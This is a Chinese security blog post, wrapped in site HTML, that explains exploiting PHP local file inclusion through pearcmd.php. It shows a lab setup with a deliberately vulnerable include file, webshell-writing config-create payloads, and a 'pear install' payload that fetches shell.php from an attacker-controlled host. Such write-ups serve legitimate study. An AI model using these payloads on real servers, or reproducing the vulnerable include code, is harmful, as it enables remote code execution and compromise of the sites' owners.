@@ -1,0 +1,367 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pearcmd | lu1ux's blog</title><meta name="author" content="lu1ux"><meta name="copyright" content="lu1ux"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="利用pearcmd.php本地文件包含（LFI）利用条件 php.ini中register_argc_argv&#x3D;On开启 安装pecl&#x2F;pear  pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装。 不过，在Docker任意版本镜像">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pearcmd">
+<meta property="og:url" content="http://example.com/2025/11/25/pearcmd/index.html">
+<meta property="og:site_name" content="lu1ux&#39;s blog">
+<meta property="og:description" content="利用pearcmd.php本地文件包含（LFI）利用条件 php.ini中register_argc_argv&#x3D;On开启 安装pecl&#x2F;pear  pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装。 不过，在Docker任意版本镜像">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/2.png">
+<meta property="article:published_time" content="2025-11-25T13:25:31.000Z">
+<meta property="article:modified_time" content="2025-11-25T13:26:27.940Z">
+<meta property="article:author" content="lu1ux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/2.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/11/25/pearcmd/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pearcmd',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-11-25 21:26:27'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="//at.alicdn.com/t/c/font_4066449_d5kq6u6u9dj.css"><link rel="stylesheet" href="/css/mine.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avator.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archive-solid"></i><span> 归档</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/2.png')"><nav id="nav"><span id="blog-info"><a href="/" title="lu1ux's blog"><span class="site-name">lu1ux's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archive-solid"></i><span> 归档</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pearcmd</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-25T13:25:31.000Z" title="Created 2025-11-25 21:25:31">2025-11-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-11-25T13:26:27.940Z" title="Updated 2025-11-25 21:26:27">2025-11-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="pearcmd"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="利用pearcmd-php本地文件包含（LFI）"><a href="#利用pearcmd-php本地文件包含（LFI）" class="headerlink" title="利用pearcmd.php本地文件包含（LFI）"></a>利用pearcmd.php本地文件包含（LFI）</h1><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>php.ini中<code>register_argc_argv=On</code>开启</li>
+<li>安装<code>pecl/pear</code></li>
+</ul>
+<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p>
+<p>不过，在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
+<p>我这个镜像是在<code>/usr/share/php</code></p>
+<p>原本pear&#x2F;pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。</p>
+<h3 id="register-argc-argv"><a href="#register-argc-argv" class="headerlink" title="register_argc_argv"></a>register_argc_argv</h3><p>如果环境中含有php.ini，则默认register_argc_argv&#x3D;Off；如果环境中没有php.ini，则默认register_argc_argv&#x3D;On</p>
+<p>当开启了这个选项，用户的输入将会被赋予给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER[&#39;argv&#39;]</code>几个变量。</p>
+<p>也就是说：当我们开启register_argc_argv选项的时候，<code>$_SERVER[‘argv’]</code>就会生效</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><code>pear</code>这个工具其实是一个命令，默认安装路径：<code>/usr/local/lib/php/pearcmd.php</code>，在命令行可以使用<code>pear</code>或</p>
+<p><code>php /usr/local/lib/php/pearcmd.php</code> 运行，如果存在文件包含漏洞，就可以运行这个命令行工具</p>
+<p>我们看看<code>register_argc_argv</code>选项，如果这个选项设置为：<code>On</code>，那么<strong>URL的？后面的内容全部会传入<code>$_SERVER[&#39;argv&#39;]</code>这个变量中</strong>，无论后面内容是否有等号</p>
+<p><code>pear</code>会在<code>pearcmd.php</code>获取命令行参数</p>
+<p>pearcmd.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PEAR_Command::setFrontendType(&#x27;CLI&#x27;);</span><br><span class="line">$all_commands = PEAR_Command::getCommands();</span><br><span class="line"></span><br><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br><span class="line">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span><br><span class="line">if (php_sapi_name() != &#x27;cli&#x27; &amp;&amp; isset($argv[1]) &amp;&amp; $argv[1] == &#x27;--&#x27;) &#123;</span><br><span class="line">    unset($argv[1]);</span><br><span class="line">    $argv = array_values($argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中会用到 <code>Console_Getopt::readPHPArgv()</code>函数获取命令行参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static function readPHPArgv()</span><br><span class="line">    &#123;</span><br><span class="line">        global $argv;</span><br><span class="line">        if (!is_array($argv)) &#123;</span><br><span class="line">            if (!@is_array($_SERVER[&#x27;argv&#x27;])) &#123;</span><br><span class="line">                if (!@is_array($GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;])) &#123;</span><br><span class="line">                    $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;;</span><br><span class="line">                    return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg);</span><br><span class="line">                &#125;</span><br><span class="line">                return $GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;];</span><br><span class="line">            &#125;</span><br><span class="line">            return $_SERVER[&#x27;argv&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">        return $argv;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先尝试<code>$argv</code>变量（这个变量存储命令行模式运行php脚本传入的参数），然后尝试<code>$_SERVER[&#39;argv&#39;]</code>变量（这个变量传入URL的？后的值。<strong>可控</strong>）</p>
+<p>这样，在文件包含下，我们就可以运行<code>pear</code>工具，并且使用<code>GET</code>请求的参数来控制<code>pear</code>的命令行参数了</p>
+<h3 id="使用docker配置LAMP"><a href="#使用docker配置LAMP" class="headerlink" title="使用docker配置LAMP???"></a>使用docker配置LAMP???</h3><p>新建一个配置文件</p>
+<p>配置docker-compose.yml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">version: &#x27;3.8&#x27;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  apache:</span><br><span class="line">    image: webdevops/php-apache</span><br><span class="line">    container_name: lamp_apache</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;80:80&quot;</span><br><span class="line">    volumes:</span><br><span class="line">      - ./www:/app</span><br><span class="line">    depends_on:</span><br><span class="line">      - mysql</span><br><span class="line"></span><br><span class="line">  mysql:</span><br><span class="line">    image: mysql:8.0</span><br><span class="line">    container_name: lamp_mysql</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_ROOT_PASSWORD: rootpassword</span><br><span class="line">      MYSQL_DATABASE: testdb</span><br><span class="line">      MYSQL_USER: testuser</span><br><span class="line">      MYSQL_PASSWORD: testpassword</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;3306:3306&quot;</span><br><span class="line">    volumes:</span><br><span class="line">      - mysql_data:/var/lib/mysql</span><br><span class="line"></span><br><span class="line">  phpmyadmin:</span><br><span class="line">    image: phpmyadmin/phpmyadmin</span><br><span class="line">    container_name: lamp_phpmyadmin</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      PMA_HOST: mysql</span><br><span class="line">      MYSQL_ROOT_PASSWORD: rootpassword</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;9090:80&quot;  # 修改端口</span><br><span class="line">    depends_on:</span><br><span class="line">      - mysql</span><br><span class="line"></span><br><span class="line">volumes:</span><br><span class="line">  mysql_data:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>运行</p>
+<p>通过<code>docker exec -it [container id] /bin/bash</code>进入docker命令行中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it lamp_apache /bin/bash</span><br></pre></td></tr></table></figure>
+
+
+
+<p>寻找pear中可以利用的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Commands:</span><br><span class="line">build                  Build an Extension From C Source</span><br><span class="line">bundle                 Unpacks a Pecl Package</span><br><span class="line">channel-add            Add a Channel</span><br><span class="line">channel-alias          Specify an alias to a channel name</span><br><span class="line">channel-delete         Remove a Channel From the List</span><br><span class="line">channel-discover       Initialize a Channel from its server</span><br><span class="line">channel-info           Retrieve Information on a Channel</span><br><span class="line">channel-login          Connects and authenticates to remote channel server</span><br><span class="line">channel-logout         Logs out from the remote channel server</span><br><span class="line">channel-update         Update an Existing Channel</span><br><span class="line">clear-cache            Clear Web Services Cache</span><br><span class="line">config-create          Create a Default configuration file</span><br><span class="line">config-get             Show One Setting</span><br><span class="line">config-help            Show Information About Setting</span><br><span class="line">config-set             Change Setting</span><br><span class="line">config-show            Show All Settings</span><br><span class="line">convert                Convert a package.xml 1.0 to package.xml 2.0 format</span><br><span class="line">cvsdiff                Run a &quot;cvs diff&quot; for all files in a package</span><br><span class="line">cvstag                 Set CVS Release Tag</span><br><span class="line">download               Download Package</span><br><span class="line">download-all           Downloads each available package from the default channel</span><br><span class="line">info                   Display information about a package</span><br><span class="line">install                Install Package</span><br><span class="line">list                   List Installed Packages In The Default Channel</span><br><span class="line">list-all               List All Packages</span><br><span class="line">list-channels          List Available Channels</span><br><span class="line">list-files             List Files In Installed Package</span><br><span class="line">list-upgrades          List Available Upgrades</span><br><span class="line">login                  Connects and authenticates to remote server [Deprecated in favor of channel-login]</span><br><span class="line">logout                 Logs out from the remote server [Deprecated in favor of channel-logout]</span><br><span class="line">makerpm                Builds an RPM spec file from a PEAR package</span><br><span class="line">package                Build Package</span><br><span class="line">package-dependencies   Show package dependencies</span><br><span class="line">package-validate       Validate Package Consistency</span><br><span class="line">pickle                 Build PECL Package</span><br><span class="line">remote-info            Information About Remote Packages</span><br><span class="line">remote-list            List Remote Packages</span><br><span class="line">run-scripts            Run Post-Install Scripts bundled with a package</span><br><span class="line">run-tests              Run Regression Tests</span><br><span class="line">search                 Search remote package database</span><br><span class="line">shell-test             Shell Script Test</span><br><span class="line">sign                   Sign a package distribution file</span><br><span class="line">svntag                 Set SVN Release Tag</span><br><span class="line">uninstall              Un-install Package</span><br><span class="line">update-channels        Update the Channel List</span><br><span class="line">upgrade                Upgrade Package</span><br><span class="line">upgrade-all            Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters]</span><br><span class="line">Usage: pear [options] command [command-options] &lt;parameters&gt;</span><br><span class="line">Type &quot;pear help options&quot; to list all options.</span><br><span class="line">Type &quot;pear help shortcuts&quot; to list all command shortcuts.</span><br><span class="line">Type &quot;pear help version&quot; or &quot;pear version&quot; to list version information.</span><br><span class="line">Type &quot;pear help &lt;command&gt;&quot; to get the help for the specified command.</span><br></pre></td></tr></table></figure>
+
+<p>找到php.ini位置</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212603349.png" alt="image-20250313164024335"></p>
+<p>设置<code>register_argc_argv=On</code></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212603296.png" alt="image-20250313164837059"></p>
+<p>然后在web主目录下创建两个文件</p>
+<p>修改一下<code>vhost.conf</code>文件,把默认目录<code>DocumentRoot</code>,改为&#x2F;var&#x2F;www&#x2F;html</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212603380.png" alt="image-20250313161511071"></p>
+<p>在var&#x2F;www&#x2F;html下创建两个文件用来测试</p>
+<p>test1.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //test.php</span><br><span class="line">include($_REQUEST[&#x27;file&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>test2.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_string(file_get_contents(__FILE__));</span><br><span class="line">var_dump($_SERVER[&#x27;argv&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch test1.php</span><br><span class="line">vi test1.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="使用PHPstudy配置"><a href="#使用PHPstudy配置" class="headerlink" title="使用PHPstudy配置"></a>使用PHPstudy配置</h3><p>调了一下php.ini</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212603426.png" alt="image-20250316172204065"></p>
+<p>pearcmdtest1.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_string(file_get_contents(__FILE__));</span><br><span class="line">include($_REQUEST[&#x27;file&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>pearcmdtest2.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_string(file_get_contents(__FILE__));</span><br><span class="line">var_dump($_SERVER[&#x27;argv&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>利用test2.php来判断$_SERVER[‘argv’]是如何解析参数的</p>
+<p>依次传入参数<code>1</code>, <code>a=1&amp;b=1</code>, <code>a=1+b=1</code></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212603279.png" alt="image-20250316172446063"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212603304.png" alt="image-20250316172511214"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212603956.png" alt="image-20250316172535993"></p>
+<p>从上面的三个例子中我们发现了一些问题：</p>
+<p>1.&amp;符无法分割参数，真正能分割参数的是加号</p>
+<p>2.等号无法赋值，而是会直接被传进去当作参数。</p>
+<h2 id="利用一-config-create"><a href="#利用一-config-create" class="headerlink" title="利用一: config-create"></a>利用一: config-create</h2><p>这个方式在 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">p神</a>文章中讲到</p>
+<p>此命令的参数和用法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config-create: must have 2 parameters, root path and filename to save as</span><br></pre></td></tr></table></figure>
+
+<p>必须传入两个参数，第一个参数传入绝对路径，第二个参数传入想要保存的文件名</p>
+<p>测试传入木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear config-create /&lt;?=@eval($_POST[lu1ux]);?&gt; /tmp/shell.php</span><br></pre></td></tr></table></figure>
+
+<p>发现上边的那个会报错,下面的这个正常执行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear config-create &quot;/&lt;?=@eval($_POST[lu1ux]);?&gt;&quot; /tmp/shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212604043.png" alt="image-20250312133644688"></p>
+<p>这样就可以利用该文件getshell了</p>
+<p>利用payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&lt;?=phpinfo()?&gt;+/tmp/hello.php </span><br></pre></td></tr></table></figure>
+
+<p>发送这个数据包，目标将会写入一个文件<code>/tmp/hello.php</code>，其内容包含<code>&lt;?=phpinfo()?&gt;</code>，这里写入文件的内容应该是<code>/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;</code>一整句话，另外，直接写入<code>&lt;?=@eval($_POST[&#39;lu1ux&#39;]);?&gt;</code>可能会在输出的时候重复输出很多次，可以多加一个die：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&#x27;lu1ux&#x27;]);die()?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功写入文件后，利用文件包含漏洞包含该文件即可实现getshell</p>
+<h2 id="利用二-install"><a href="#利用二-install" class="headerlink" title="利用二:install"></a>利用二:install</h2><p>我们可以使用如下命令下载服务器上的文件到靶机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear install http://[vps]:[port]/test1.php</span><br></pre></td></tr></table></figure>
+
+<p>用我自己的服务器试一下</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212604132.png" alt="image-20250313155013856"></p>
+<p>发现下载成功了</p>
+<p>因为PEAR 只能安装 <code>.tgz</code> 包，而 <code>index.php</code> 不是压缩包,所以安装失败<code>install  fail</code></p>
+<p>切换到他给的路径,发现了一个名字为我的ip的文件</p>
+<p>成功读取到我下载的我服务器上的index.php源码</p>
+<p>我们想要配合文件包含漏洞，就需要知道一个参数：<code>--installroot</code>，这个选项可以指定安装目录，这样就可以构造payload远程下载文件了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps]:[port]/shell.php</span><br></pre></td></tr></table></figure>
+
+<p>这条 <strong>PEAR RCE（远程代码执行）Payload</strong> 的作用是：<br>通过 <strong>PEAR 的 <code>install</code> 命令</strong>，<strong>下载并覆盖</strong> 服务器上的 <code>pearcmd.php</code>，然后你就可以远程执行代码了。</p>
+<p>这串payload所下载的文件的保存地址在 &amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php以及&#x2F;tmp&#x2F;pear&#x2F;download&#x2F;路径下面，</p>
+<p>有时候会遇到配置方面的问题,因为名为<code>&amp;file=/usr/local/lib/php/pearcmd.php\&amp;</code>的文件夹是新创建的，而我并没有权限对其进行写操作而导致利用失败。</p>
